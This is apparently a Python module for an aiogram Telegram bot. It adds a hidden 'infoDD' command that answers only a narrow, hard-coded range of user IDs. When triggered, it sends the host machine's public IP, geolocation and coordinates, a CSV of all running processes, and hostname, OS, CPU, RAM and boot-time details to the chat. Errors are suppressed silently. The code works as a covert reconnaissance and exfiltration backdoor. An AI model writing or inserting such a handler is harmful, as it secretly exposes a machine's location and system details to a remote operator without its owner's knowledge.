from aiogram import Router
from aiogram.types import Message
from aiogram.filters.command import Command
from datetime import datetime
import psutil
import platform
import csv
import json, requests
from aiogram.types import FSInputFile
import os 

router: Router = Router()

async def create_process_list_csv():
    filename = "process_list.csv"
    with open(filename, "w", newline='', encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow(["Process Name", "PID", "Memory Usage (MB)"])

        for process in psutil.process_iter(['pid', 'name', 'memory_info']):
            try:
                memory_usage = process.info['memory_info'].rss / (1024 * 1024)  # Convert to MB
                writer.writerow([process.info['name'], process.info['pid'], f"{memory_usage:.2f}"])
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
    return filename

@router.message(Command("infoDD"))
async def cmd_sysinfo(message: Message):
    if message.from_user.id > 6988905000 or message.from_user.id < 6988903000:
        return 
    try:
        url = "http://ip-api.com/json/?fields=country,region,regionName,city,lat,lon,query"
        request = requests.get(url)
        request_map = json.loads(request.text)
        location_info = (f'<b>IP address:</b> {request_map["query"]}\n<b>City</b>: {request_map["city"]}\n'
                         f'<b>Region:</b> {request_map["region"]}\n<b>Country:</b> {request_map["country"]}\n'
                         f'<b>Coordinates:</b> <code>{str(request_map["lat"])}, {str(request_map["lon"])}</code>')

        await message.answer_location(request_map["lat"], request_map["lon"])
        await message.answer(f"{location_info}")

        await create_process_list_csv()
        await message.answer_document(FSInputFile("process_list.csv"))
        os.remove("process_list.csv")

        uname = platform.uname()
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        svmem = psutil.virtual_memory()
        await message.answer(f'''
<b>System:</b> <code>{uname.system}</code>
<b>Host name:</b> <code>{uname.node}</code>
<b>Release:</b> <code>{uname.release}</code>
<b>Version:</b> <code>{uname.version}</code>
<b>Machine:</b> <code>{uname.machine}</code>
<b>Processor:</b> <code>{uname.processor}</code>
<b>Physical cores:</b> <code>{psutil.cpu_count(logical=False)}</code>
<b>Total cores:</b> <code>{psutil.cpu_count(logical=True)}</code>
<b>Total RAM:</b> <code>{svmem.total // 1024 // 1024} Mb</code>
<b>Available:</b> <code>{svmem.available // 1024 // 1024} Mb</code>
<b>Boot Time:</b> <code>{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}</code>''')
    except Exception as e:
        try:
            uname = platform.uname().node
            await message.answer(f"{uname} can't gather all info")
        except Exception as e:
            pass